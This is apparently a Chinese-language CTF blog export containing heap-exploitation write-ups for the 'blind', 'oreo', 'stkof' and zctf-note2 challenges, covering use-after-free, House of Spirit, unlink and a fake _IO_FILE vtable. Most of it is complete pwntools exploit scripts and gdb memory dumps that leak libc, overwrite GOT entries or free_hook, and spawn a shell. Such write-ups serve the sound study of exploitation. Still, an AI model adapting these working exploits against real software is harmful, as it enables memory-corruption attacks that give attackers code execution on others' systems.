0x0000000000000000``#-------------leak libc addr--------------------Edit(0, p64(heap_addr + 0x20) + p64(0) + p64(0) + p64(0x31))gdb.attach(p)Add(6, p64(0) + p64(0xa1) + &apos;\\n&apos;)Add(7, p64(0) + p64(0xa1) + &apos;\\n&apos;)gdb.attach(p)Delete(1)Show(1)libc_address = u64(p.recvline()[ : -1].ljust(8, &apos;\\x00&apos;))-0x3c4b78print &quot;libc_addr: &quot; + hex(libc_address)gdb.attach(p)``pwndbg&gt; x/10gx 0x0000000000602060 &lt;---- chunk_ptr 0-70x602060: 0x00000000011e2010 0x00000000011e20400x602070: 0x00000000011e2070 0x00000000011e20a00x602080: 0x0000000000602068 0x00000000011e21000x602090: 0x00000000011e2010 0x00000000011e2030 &lt;---被带偏的chunk0x6020a0: 0x0000000000000000 0x0000000000000000pwndbg&gt; x/40gx 0x000000000011e20000x11e2000: 0x0000000000000000 0x00000000000000310x11e2010: 0x0000000000000000 0x00000000000000a10x11e2020: 0x0000000000000000 0x00000000000000310x11e2030: 0x0000000000000000 0x00000000000000d1 &lt;-----fake small chunk0x11e2040: 0x00007f042e615b78 0x00007f042e615b78 &lt;-----get libc addr 0x11e2050: 0x0000000000000000 0x00000000000000000x11e2060: 0x0000000000000000 0x00000000000000310x11e2070: 0x6363636363636363 0x00000000000000000x11e2080: 0x0000000000000000 0x00000000000000000x11e2090: 0x0000000000000000 0x00000000000000310x11e20a0: 0x6464646464646464 0x00000000000000000x11e20b0: 0x0000000000000000 0x00000000000000000x11e20c0: 0x0000000000000000 0x00000000000000310x11e20d0: 0x00000000000000a0 0x00000000000000310x11e20e0: 0x0000000000602068 0x00000000006020700x11e20f0: 0x0000000000000000 0x00000000000000310x11e2100: 0x00000000000000d0 0x00000000000000300x11e2110: 0x0000000000000000 0x00000000000000000x11e2120: 0x0000000000000000 0x0000000000020ee10x11e2130: 0x0000000000000000 0x0000000000000000``#---------cover free_hook with one_gadget to get shell --------------------------one_gadget = 0x45216free_hook = libc_address + 0x3c67a8print &quot;free_hook: &quot;+ hex(free_hook)Edit(4,p64(free_hook) + &apos;\\n&apos;)Edit(1, p64(libc_address + one_gadget)[:-1] + &apos;\\n&apos;)Delete(1)p.interactive() blind题目题目风格与babyheap基本一致：malloc的chunk大小变为0x68 最后得到的chunk也就是0x70,最多6个chunk；edit函数功能一致，去掉了次数限制，show函数被去掉；free函数仍然存在UAF，且限制3次。同时添加了一个system(‘/bin/sh’)的函数。 分析直接给了system(‘/bin/sh’)的函数，所以目标就是控制程序执行该函数；看了半天没有头绪，能知道利用UAF漏洞将chunk分配到想要的地方，但是因为没有show函数，并没有办法泄露栈地址；去看了下大佬们的思路，发现是将chunk malloc到bss段，而bss段存在着_IO_FILE的结构体及vtable虚表指针，我们通过修改指针指向，之后伪造file结构体及伪造虚表指针，程序在退出时会自动调用从而拿到shell。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556pwndbg&gt; x/6gx 0x602020 &lt;---------bss段的file指针0x602020 &lt;stdout&gt;: 0x00007ffff7dd2620 0x0000000000000000 0x602030 &lt;stdin&gt;: 0x00007ffff7dd18e0 0x00000000000000000x602040 &lt;stderr&gt;: 0x00007ffff7dd2540 0x0000000000000000pwndbg&gt; x/28gx 0x00007ffff7dd2620 &lt;----------stdout的结构体0x7ffff7dd2620 &lt;_IO_2_1_stdout_&gt;: 0x00000000fbad2887 0x00007ffff7dd26a30x7ffff7dd2630 &lt;_IO_2_1_stdout_+16&gt;: 0x00007ffff7dd26a3 0x00007ffff7dd26a30x7ffff7dd2640 &lt;_IO_2_1_stdout_+32&gt;: 0x00007ffff7dd26a3 0x00007ffff7dd26a30x7ffff7dd2650 &lt;_IO_2_1_stdout_+48&gt;: 0x00007ffff7dd26a3 0x00007ffff7dd26a30x7ffff7dd2660 &lt;_IO_2_1_stdout_+64&gt;: 0x00007ffff7dd26a4 0x00000000000000000x7ffff7dd2670 &lt;_IO_2_1_stdout_+80&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd2680 &lt;_IO_2_1_stdout_+96&gt;: 0x0000000000000000 0x00007ffff7dd18e00x7ffff7dd2690 &lt;_IO_2_1_stdout_+112&gt;: 0x0000000000000001 0xffffffffffffffff0x7ffff7dd26a0 &lt;_IO_2_1_stdout_+128&gt;: 0x000000000a000000 0x00007ffff7dd37800x7ffff7dd26b0 &lt;_IO_2_1_stdout_+144&gt;: 0xffffffffffffffff 0x00000000000000000x7ffff7dd26c0 &lt;_IO_2_1_stdout_+160&gt;: 0x00007ffff7dd17a0 0x00000000000000000x7ffff7dd26d0 &lt;_IO_2_1_stdout_+176&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd26e0 &lt;_IO_2_1_stdout_+192&gt;: 0x00000000ffffffff 0x00000000000000000x7ffff7dd26f0 &lt;_IO_2_1_stdout_+208&gt;: 0x0000000000000000 0x00007ffff7dd06e0pwndbg&gt; p *(struct _IO_FILE_plus *) stdout &lt;--------结构体含义$4 = &#123; file = &#123; _flags = -72537977, _IO_read_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_read_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_read_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_write_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_write_ptr = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_write_end = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_buf_base = 0x7ffff7dd26a3 &lt;_IO_2_1_stdout_+131&gt; &quot;\\n&quot;, _IO_buf_end = 0x7ffff7dd26a4 &lt;_IO_2_1_stdout_+132&gt; &quot;&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;, _fileno = 1, _flags2 = 0, _old_offset = -1, _cur_column = 0, _vtable_offset = 0 &apos;\\000&apos;, _shortbuf = &quot;\\n&quot;, _lock = 0x7ffff7dd3780 &lt;_IO_stdfile_1_lock&gt;, _offset = -1, _codecvt = 0x0, _wide_data = 0x7ffff7dd17a0 &lt;_IO_wide_data_1&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = -1, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dd06e0 &lt;_IO_file_jumps&gt; &lt;---------将要被修改指向system(&apos;/bin/sh&apos;)函数的虚表指针&#125; 这个确实是知识点不足，对_IO_FILE比较陌生。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from pwn import *context.log_level=&apos;debug&apos;sh = process(&apos;./blind&apos;)elf = ELF(&apos;./libc.so.6&apos;)def new(idx,content): sh.sendline(&apos;1&apos;) sh.recvuntil(&apos;Index:&apos;) sh.sendline(str(idx)) sh.recvuntil(&apos;Content:&apos;) sh.send(content) sh.recvuntil(&apos;Choice:&apos;)def change(idx,content): sh.sendline(&apos;2&apos;) sh.recvuntil(&apos;Index:&apos;) sh.sendline(str(idx)) sh.recvuntil(&apos;Content:&apos;) sh.send(content) sh.recv()def delete(idx): sh.sendline(&apos;3&apos;) sh.recvuntil(&apos;Index:&apos;) sh.sendline(str(idx)) sh.recvuntil(&apos;Choice:&apos;)system_addr = 0x4008E3new(0,&apos;a\\n&apos;)new(1,&apos;b\\n&apos;)delete(0)change(0,p64(0x60203d)+&apos;\\n&apos;) &lt;-------直接利用UAF漏洞伪造fastbin，相对于释放两个再伪造方便了不少gdb.attach(sh)payload = &apos;a&apos;*0x13 + p64(0x602020)+p64(0x602090)+ p64(0x602090+0x68)+ p64(0x602090+0x68*2) + p64(0x602090+0x68*3)+&apos;\\n&apos;new(2,&apos;a\\n&apos;)new(3,payload) &lt;-------------伪造的chunk 再用来修改存储chunk指针的地方，后面malloc的事直接省了，还不用考虑过malloc(fastbin)的检查gdb.attach(sh)fake_struct = p64(0x00000000fbad8000) + p64(0x602060)*7 + p64(0x602061) + p64(0)*4 fake_struct += p64(0x602060) + p64(0x1) + p64(0xffffffffffffffff) + p64(0)fake_struct += p64(0x602060) + p64(0xffffffffffffffff) + p64(0) + p64(0x602060) fake_struct += p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 + p64(0x602090 + 0x68*3)fake_vtable = p64(system_addr)*10change(1,fake_struct[:0x68])change(2,fake_struct[0x68:0xd0])change(3,fake_struct[0xd0:]+&apos;\\n&apos;)change(4,fake_vtable+&apos;\\n&apos;)gdb.attach(sh)x/100gx 0x6020200x602020 &lt;stdout&gt;: 0x00007f8bb5dde620 0x0000000000000000 0x602030 &lt;stdin&gt;: 0x00007f8bb5ddd8e0 0x00000000000000000x602040 &lt;stderr&gt;: 0x00007f8bb5dde540 0x61616100000000000x602050: 0x6161616161616161 0x61616161616161610x602060: 0x0000000000602020 0x00000000006020900x602070: 0x00000000006020f8 0x0000000000602160 &lt;-----伪造的一堆chunk指针0x602080: 0x00000000006021c8 0x00000000000000000x602090: 0x00000000fbad8000 0x0000000000602060 &lt;-----fake_struct 开始0x6020a0: 0x0000000000602060 0x00000000006020600x6020b0: 0x0000000000602060 0x00000000006020600x6020c0: 0x0000000000602060 0x00000000006020600x6020d0: 0x0000000000602061 0x00000000000000000x6020e0: 0x0000000000000000 0x00000000000000000x6020f0: 0x0000000000000000 0x00000000006020600x602100: 0x0000000000000001 0xffffffffffffffff0x602110: 0x0000000000000000 0x00000000006020600x602120: 0xffffffffffffffff 0x00000000000000000x602130: 0x0000000000602060 0x00000000000000000x602140: 0x0000000000000000 0x00000000000000000x602150: 0x00000000ffffffff 0x00000000000000000x602160: 0x0000000000000000 0x00000000006021c8 &lt;----vtable指针指向存放system(&apos;/bin/sh&apos;)函数的地址0x602170: 0x0000000000000000 0x00000000000000000x602180: 0x0000000000000000 0x00000000000000000x602190: 0x0000000000000000 0x00000000000000000x6021a0: 0x0000000000000000 0x00000000000000000x6021b0: 0x0000000000000000 0x00000000000000000x6021c0: 0x0000000000000000 0x00000000004008e3 &lt;-----存放了一堆system(&apos;/bin/sh&apos;)函数的地址，便于命中0x6021d0: 0x00000000004008e3 0x00000000004008e30x6021e0: 0x00000000004008e3 0x00000000004008e30x6021f0: 0x00000000004008e3 0x00000000004008e30x602200: 0x00000000004008e3 0x00000000004008e30x602210: 0x00000000004008e3 0x0000000000000000change(0,p64(0x602090)+&apos;\\n&apos;) &lt;------修改stdout指针，稳了sh.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn2.5-HouseOfSpirit","slug":"introduction-to-pwn2-5-houseofspirit","date":"2018-12-23T12:50:03.000Z","updated":"2018-12-29T04:14:14.569Z","comments":true,"path":"2018/12/23/introduction-to-pwn2-5-houseofspirit/","link":"","permalink":"http://siriuswhiter.tk/2018/12/23/introduction-to-pwn2-5-houseofspirit/","excerpt":"","text":"House of Spirit 原理终于正式步入了houseof系列！！ house of spirit 其实也属于fastbin attack。简单来讲就是伪造一个chunk，不论这个chunk在什么位置，使之能够满足被free的条件，之后再将其malloc出来，因为malloc到了一个我们可控的区域，就有希望继续为所欲为。 依旧heap-explotation举例 1234567891011121314151617181920212223242526272829struct fast_chunk &#123; size_t prev_size; size_t size; struct fast_chunk *fd; struct fast_chunk *bk; char buf[0x20]; // chunk falls in fastbin size range&#125;;struct fast_chunk fake_chunks[2]; // Two chunks in consecutive memory// fake_chunks[0] at 0x7ffe220c5ca0// fake_chunks[1] at 0x7ffe220c5ce0void *ptr, *victim;ptr = malloc(0x30); // First malloc// Passes size check of &quot;free(): invalid size&quot;fake_chunks[0].size = sizeof(struct fast_chunk); // 0x40// Passes &quot;free(): invalid next size (fast)&quot;fake_chunks[1].size = sizeof(struct fast_chunk); // 0x40// Attacker overwrites a pointer that is about to be &apos;freed&apos;ptr = (void *)&amp;fake_chunks[0].fd;// fake_chunks[0] gets inserted into fastbinfree(ptr);victim = malloc(0x30); // 0x7ffe220c5cb0 address returned from malloc 可以看见最后malloc到了fakechunk的位置，之后具体的利用以oreo举例 oreo条件1.malloc123456789101112131415161718192021222324252627282930313233unsigned int add()&#123; rifle *v1; // [esp+18h] [ebp-10h] unsigned int v2; // [esp+1Ch] [ebp-Ch] v2 = __readgsdword(0x14u); v1 = head; head = (rifle *)malloc(0x38u); if ( head ) &#123; head-&gt;next = v1; printf(&quot;Rifle name: &quot;); fgets(head-&gt;name, 0x38, stdin); cut_enter(head-&gt;name); printf(&quot;Rifle description: &quot;); fgets(head-&gt;descript, 0x38, stdin); cut_enter(head-&gt;descript); ++rifle_cnt; &#125; else &#123; puts(&quot;Something terrible happened!&quot;); &#125; return __readgsdword(0x14u) ^ v2;&#125;分析得到的结构体, name及description存在明显的溢出。00000000 rifle struc ; (sizeof=0x38, mappedto_5)00000000 descript db 25 dup(?)00000019 name db 27 dup(?)00000034 next dd ? ; offset00000038 rifle ends 2.show 通过i-&gt;next遍历所有的malloc结果 123456789101112131415unsigned int show_rifles()&#123; rifle *i; // [esp+14h] [ebp-14h] unsigned int v2; // [esp+1Ch] [ebp-Ch] v2 = __readgsdword(0x14u); printf(&quot;Rifle to be ordered:\\n%s\\n&quot;, &quot;===================================&quot;); for ( i = head; i; i = i-&gt;next ) &#123; printf(&quot;Name: %s\\n&quot;, i-&gt;name); printf(&quot;Description: %s\\n&quot;, i); puts(&quot;===================================&quot;); &#125; return __readgsdword(0x14u) ^ v2;&#125; 3.message 给了一块0x80大小的可以写notice的内存，给了我们伪造bypass fakechunk检查的机会 12345678910unsigned int message()&#123; unsigned int v0; // ST1C_4 v0 = __readgsdword(0x14u); printf(&quot;Enter any notice you&apos;d like to submit with your order: &quot;); fgets(notice, 0x80, stdin); cut_enter(notice); return __readgsdword(0x14u) ^ v0;&#125; 思路在上面的条件之下，我们便有了机会利用house of spirit 的机会，注意到bss段变量的存放顺序–&gt; 12345678910.bss:0804A288 head .bss:0804A288 .bss:0804A28C .bss:0804A2A0 order_num .bss:0804A2A0 .bss:0804A2A4 rifle_cnt .bss:0804A2A4 .bss:0804A2A8 ; char *notice.bss:0804A2A8 notice .bss:0804A2A8 而程序中仅有固定的malloc(0x38)，分配出来的chunk size应该为0x41,我们可以想到，当malloc足够的chunk时，rifle_cnt将可以达到0x40，为了绕过free fastbin的检查我们就需要在notice中伪造nextchunk的pre_size 及size，这个很容易以做到。伪造完成后，因为add中存在对name的溢出，那么如果将其溢出至rifle-&gt;next的位置，填入任一函数的got地址，那么在show时便足以泄露实际地址然后得到system，/bin/sh的地址。之后便将其溢出为fakechunk处，为之后的free做好准备。 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import *context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]if args[&apos;DEBUG&apos;]: context.log_level = &apos;debug&apos;context.binary = &quot;./oreo&quot;oreo = ELF(&quot;./oreo&quot;)if args[&apos;REMOTE&apos;]: p = remote(ip, port)else: p = process(&quot;./oreo&quot;)log.info(&apos;PID: &apos; + str(proc.pidof(p)[0]))libc = ELF(&apos;./libc.so.6&apos;)def add(descrip, name): p.sendline(&apos;1&apos;) #p.recvuntil(&apos;Rifle name: &apos;) p.sendline(name) #p.recvuntil(&apos;Rifle description: &apos;) #sleep(0.5) p.sendline(descrip)def show_rifle(): p.sendline(&apos;2&apos;) p.recvuntil(&apos;===================================\\n&apos;)def order(): p.sendline(&apos;3&apos;)def message(notice): p.sendline(&apos;4&apos;) #p.recvuntil(&quot;Enter any notice you&apos;d like to submit with your order: &quot;) p.sendline(notice)def exp(): print &apos;step 1. leak libc base&apos; name = 27 * &apos;a&apos; + p32(oreo.got[&apos;puts&apos;]) add(25 * &apos;a&apos;, name) show_rifle() p.recvuntil(&apos;===================================\\n&apos;) p.recvuntil(&apos;Description: &apos;) puts_addr = u32(p.recvuntil(&apos;\\n&apos;, drop=True)[:4]) log.success(&apos;puts addr: &apos; + hex(puts_addr)) libc_base = puts_addr - libc.symbols[&apos;puts&apos;] system_addr = libc_base + libc.symbols[&apos;system&apos;] binsh_addr = libc_base + next(libc.search(&apos;/bin/sh&apos;)) print &quot;binsh_addr: &quot; + hex(binsh_addr) print &apos;step 2. free fake chunk at 0x0804A2A8&apos; # now, oifle_cnt=1, we need set it = 0x40 oifle = 1 while oifle &lt; 0x3f: # set next link=NULL add(25 * &apos;a&apos;, &apos;a&apos; * 27 + p32(0)) oifle += 1 payload = &apos;a&apos; * 27 + p32(0x0804a2a8) # set next link=0x0804A2A8, try to free a fake chunk add(25 * &apos;a&apos;, payload) # before free, we need to bypass some check # fake chunk&apos;s size is 0x40 # 0x20 *&apos;a&apos; for padding the last fake chunk # 0x40 for fake chunk&apos;s next chunk&apos;s prev_size # 0x100 for fake chunk&apos;s next chunk&apos;s size # set fake iofle&apos; next to be NULL payload = 0x20 * &apos;\\x00&apos; + p32(0x40) + p32(0x100) payload = payload.ljust(52, &apos;b&apos;) payload += p32(0) payload = payload.ljust(128, &apos;c&apos;) message(payload) # fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL order() p.recvuntil(&apos;Okay order submitted!\\n&apos;) print &apos;step 3. get shell&apos; # modify strlen@got to system addr // don&apos;t know why modified free@got addr could&apos;t get shell payload = p32(oreo.got[&apos;strlen&apos;]).ljust(20, &apos;a&apos;) add(payload, &apos;b&apos; * 20) log.success(&apos;system addr: &apos; + hex(system_addr)) #gdb.attach(p) message(p32(system_addr) + &apos;;/bin/sh\\x00&apos;) p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn2.4-unlink","slug":"introduction-to-pwn2-4-unlink","date":"2018-12-20T02:34:50.000Z","updated":"2018-12-22T14:40:53.644Z","comments":true,"path":"2018/12/20/introduction-to-pwn2-4-unlink/","link":"","permalink":"http://siriuswhiter.tk/2018/12/20/introduction-to-pwn2-4-unlink/","excerpt":"","text":"之前看了好久的unlink，现在回来再看一下，顺便写个笔记 unlink 原理 当创建几个满足smallbin大小的块时，如果有可能使数据溢出，那么在中间的一个chunk中可以伪造一个fakechunk，同时溢出至下一个chunk的头部，伪造pre_size为fakechunk的size，修改size处的标志位，使之认为前一个chunk为空。 那么在free nextchunk(chunk2)时，因为unlink的机制，会先检查前一块chunk1是否为空，如果通过检验，那么便会将其卸下，之后再检查nextnextchunk(chunk3)，发现正在使用，则执行unlink 12345 FD=P-&gt;fdBK=P-&gt;bk FD-&gt;bk = BKBK-&gt;fd = FD 这样的操作在正常情况下会将空闲chunk卸下，但是在这样的伪造情况下，chunk1中的fakechunk便会进入chunklist。而在前面绕过unlink检查时，我们修改了fd与bk指针，使得P-&gt;FD-&gt;BK = P, P-&gt;BK-&gt;FD = P；为了能够得到对指针的控制，我们倾向于将其指向chunk1的指针所放置的内存之上，之后再修改chunk1的内容，实质上便是在修改自己的指针放置的位置及之后的指针，从而修改got表或者malloc_hook或free_hook之类的达到get_shell的目的。 使用heap-exploitation的例子来见证一下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445struct chunk_structure &#123; size_t prev_size; size_t size; struct chunk_structure *fd; struct chunk_structure *bk; char buf[10]; // padding&#125;;unsigned long long *chunk1, *chunk2;struct chunk_structure *fake_chunk, *chunk2_hdr;char data[20];// First grab two chunks (non fast)chunk1 = malloc(0x80); // Points to 0xa0e010chunk2 = malloc(0x80); // Points to 0xa0e0a0// Assuming attacker has control over chunk1&apos;s contents// Overflow the heap, override chunk2&apos;s header// First forge a fake chunk starting at chunk1// Need to setup fd and bk pointers to pass the unlink security checkfake_chunk = (struct chunk_structure *)chunk1;fake_chunk-&gt;fd = (struct chunk_structure *)(&amp;chunk1 - 3); // Ensures P-&gt;fd-&gt;bk == Pfake_chunk-&gt;bk = (struct chunk_structure *)(&amp;chunk1 - 2); // Ensures P-&gt;bk-&gt;fd == P// Next modify the header of chunk2 to pass all security checkschunk2_hdr = (struct chunk_structure *)(chunk2 - 2);chunk2_hdr-&gt;prev_size = 0x80; // chunk1&apos;s data region sizechunk2_hdr-&gt;size &amp;= ~1; // Unsetting prev_in_use bit// Now, when chunk2 is freed, attacker&apos;s fake chunk is &apos;unlinked&apos;// This results in chunk1 pointer pointing to chunk1 - 3// i.e. chunk1[3] now contains chunk1 itself.// We then make chunk1 point to some victim&apos;s datafree(chunk2);chunk1[3] = (unsigned long long)data;strcpy(data, &quot;Victim&apos;s data&quot;);// Overwrite victim&apos;s data using chunk1chunk1[0] = 0x002164656b636168LL; // hex for &quot;hacked!&quot;printf(&quot;%s\\n&quot;, data); // Prints &quot;hacked!&quot; stkof条件选项1：malloc_chunk 1234567891011121314151617signed __int64 malloc_chunk()&#123; __int64 size; // [rsp+0h] [rbp-80h] char *v2; // [rsp+8h] [rbp-78h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v4; // [rsp+78h] [rbp-8h] v4 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); size = atoll(&amp;s); v2 = (char *)malloc(size); if ( !v2 ) return 0xFFFFFFFFLL; ::s[++index] = v2; // ::全局 printf(&quot;%d\\n&quot;, (unsigned int)index, size); return 0LL;&#125; 选项二：edit_chunk //完全没考虑之前malloc时的大小，直接溢出就对了 12345678910111213141516171819202122232425262728293031signed __int64 edit_chunk()&#123; signed __int64 result; // rax int i; // eax unsigned int index; // [rsp+8h] [rbp-88h] __int64 size; // [rsp+10h] [rbp-80h] char *ptr; // [rsp+18h] [rbp-78h] char s; // [rsp+20h] [rbp-70h] unsigned __int64 v6; // [rsp+88h] [rbp-8h] v6 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); index = atol(&amp;s); if ( index &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[index] ) return 0xFFFFFFFFLL; fgets(&amp;s, 16, stdin); size = atoll(&amp;s); ptr = ::s[index]; for ( i = fread(ptr, 1uLL, size, stdin); i &gt; 0; i = fread(ptr, 1uLL, size, stdin) ) &#123; ptr += i; size -= i; &#125; if ( size ) result = 0xFFFFFFFFLL; else result = 0LL; return result;&#125; 选项三：free_chunk 1234567891011121314151617signed __int64 free_chunk()&#123; unsigned int v1; // [rsp+Ch] [rbp-74h] char s; // [rsp+10h] [rbp-70h] unsigned __int64 v3; // [rsp+78h] [rbp-8h] v3 = __readfsqword(0x28u); fgets(&amp;s, 16, stdin); v1 = atol(&amp;s); if ( v1 &gt; 0x100000 ) return 0xFFFFFFFFLL; if ( !::s[v1] ) return 0xFFFFFFFFLL; free(::s[v1]); ::s[v1] = 0LL; // free and make it be 0 return 0LL;&#125; 分析基本上没什么分析的。。。漏洞很明显，就是在告诉你来unlink。 思路就是malloc几个smallbin大小的chunk，之后伪造fakechunk unlink，之后edit被伪造的fakechunk的chunk，修改free，atoi的got表，调用system(“/bin/sh”)获得shell1.利用unlink修改修改GOT表。2.泄露libc基址。3.将free_got改成system_addr.4.free一个内存块，其中的内容是”/bin/sh”。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129from pwn import *context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]if args[&apos;DEBUG&apos;]: context.log_level = &apos;debug&apos;context.binary = &quot;./stkof&quot;stkof = ELF(&apos;./stkof&apos;)if args[&apos;REMOTE&apos;]: p = remote(&apos;127.0.0.1&apos;, 7777)else: p = process(&quot;./stkof&quot;)log.info(&apos;PID: &apos; + str(proc.pidof(p)[0]))libc = ELF(&apos;./libc.so.6&apos;)head = 0x602140 //ida可以直接看，全局分配在了bss段def alloc(size): p.sendline(&apos;1&apos;) p.sendline(str(size)) p.recvuntil(&apos;OK\\n&apos;)def edit(idx, size, content): p.sendline(&apos;2&apos;) p.sendline(str(idx)) p.sendline(str(size)) p.send(content) p.recvuntil(&apos;OK\\n&apos;)def free(idx): p.sendline(&apos;3&apos;) p.sendline(str(idx))def exp(): # trigger to malloc buffer for io function alloc(0x100) # idx 1 alloc(0x30) # idx 2 # small chunk size inorder to trigger unlink alloc(0x80) # idx 3 # a fake chunk at global[2]=head+16 who&apos;s size is 0x20pwndbg&gt; x/6gx 0x6021400x602140: 0x0000000000000000 0x000000000244d0200x602150: 0x000000000244d540 0x000000000244d5800x602160: 0x0000000000000000 0x0000000000000000pwndbg&gt; x/100gx 0x000000000244d5300x244d530: 0x0000000000000000 0x00000000000000410x244d540: 0x0000000000000000 0x00000000000000000x244d550: 0x0000000000000000 0x00000000000000000x244d560: 0x0000000000000000 0x00000000000000000x244d570: 0x0000000000000000 0x00000000000000910x244d580: 0x0000000000000000 0x00000000000000000x244d590: 0x0000000000000000 0x00000000000000000x244d5a0: 0x0000000000000000 0x00000000000000000x244d5b0: 0x0000000000000000 0x00000000000000000x244d5c0: 0x0000000000000000 0x00000000000000000x244d5d0: 0x0000000000000000 0x00000000000000000x244d5e0: 0x0000000000000000 0x00000000000000000x244d5f0: 0x0000000000000000 0x00000000000000000x244d600: 0x0000000000000000 0x0000000000020a010x244d610: 0x0000000000000000 0x0000000000000000 payload = p64(0) #prev_size payload += p64(0x20) #size payload += p64(head + 16 - 0x18) #fd payload += p64(head + 16 - 0x10) #bk payload += p64(0x20) # next chunk&apos;s prev_size bypass the check payload = payload.ljust(0x30, &apos;a&apos;) # overwrite global[3]&apos;s chunk&apos;s prev_size # make it believe that prev chunk is at global[2] payload += p64(0x30) # make it believe that prev chunk is free payload += p64(0x90) edit(2, len(payload), payload) # unlink fake chunk, so global[2] =&amp;(global[2])-0x18=head-8 free(3) p.recvuntil(&apos;OK\\n&apos;) gdb.attach(p)pwndbg&gt; x/6gx 0x6021400x602140: 0x0000000000000000 0x000000000244d0200x602150: 0x0000000000602138 0x00000000000000000x602160: 0x0000000000000000 0x0000000000000000 # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got payload = &apos;a&apos; * 8 + p64(stkof.got[&apos;free&apos;]) + p64(stkof.got[&apos;puts&apos;]) + p64( stkof.got[&apos;atoi&apos;]) edit(2, len(payload), payload) # edit free@got to puts@plt payload = p64(stkof.plt[&apos;puts&apos;]) edit(0, len(payload), payload) gdb.attach(p)pwndbg&gt; x/6gx 0x6021300x602130: 0x0000000000000000 0x61616161616161610x602140: 0x0000000000602018 //free 0x0000000000602020 //puts0x602150: 0x0000000000602088 //atoi 0x0000000000000000 #free global[1] to leak puts addr free(1) puts_addr = p.recvuntil(&apos;\\nOK\\n&apos;, drop=True).ljust(8, &apos;\\x00&apos;) puts_addr = u64(puts_addr) log.success(&apos;puts addr: &apos; + hex(puts_addr)) libc_base = puts_addr - libc.symbols[&apos;puts&apos;] binsh_addr = libc_base + next(libc.search(&apos;/bin/sh&apos;)) system_addr = libc_base + libc.symbols[&apos;system&apos;] log.success(&apos;libc base: &apos; + hex(libc_base)) log.success(&apos;/bin/sh addr: &apos; + hex(binsh_addr)) log.success(&apos;system addr: &apos; + hex(system_addr)) # modify atoi@got to system addr payload = p64(system_addr) edit(2, len(payload), payload) p.send(p64(binsh_addr)) p.interactive()if __name__ == &quot;__main__&quot;: exp() zctf-note2其实和stkof差不太多 条件 创建 //最多只能有三个note，同时note大小最大128 123456789101112131415161718192021int NewNote()&#123; char *note; // ST08_8 unsigned int v2; // eax unsigned int size; // [rsp+4h] [rbp-Ch] if ( (unsigned int)NoteNum &gt; 3 ) return puts(&quot;note lists are full&quot;); puts(&quot;Input the length of the note content:(less than 128)&quot;); size = inputNum(); if ( size &gt; 0x80 ) return puts(&quot;Too long&quot;); note = (char *)malloc(size); puts(&quot;Input the note content:&quot;); ReadStr(note, size, 10); RemovePercent(note); ptr[NoteNum] = (__int64)note; Len[NoteNum] = size; v2 = NoteNum++; return printf(&quot;note add success, the id is %d\\n&quot;, v2);&#125; 修改 //两种方式，overwrite与append 123456789101112131415161718192021puts(&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;); v4 = inputNum(); if ( v4 == 1 || v4 == 2 ) &#123; if ( v4 == 1 ) dest = 0; else strcpy(&amp;dest, src); v0 = (char *)malloc(0xA0uLL); v8 = v0; *(_QWORD *)v0 = &apos;oCweNehT&apos;; *((_QWORD *)v0 + 1) = &apos;:stnetn&apos;; printf(v8); ReadStr(v8 + 15, 0x90LL, 10); RemovePercent(v8 + 15); v1 = v8; v1[v6 - strlen(&amp;dest) + 14] = 0; strncat(&amp;dest, v8 + 15, 0xFFFFFFFFFFFFFFFFLL); strcpy(src, &amp;dest); free(v8); puts(&quot;Edit note success!&quot;); 还有show的功能和delete的功能，这里就不展示了 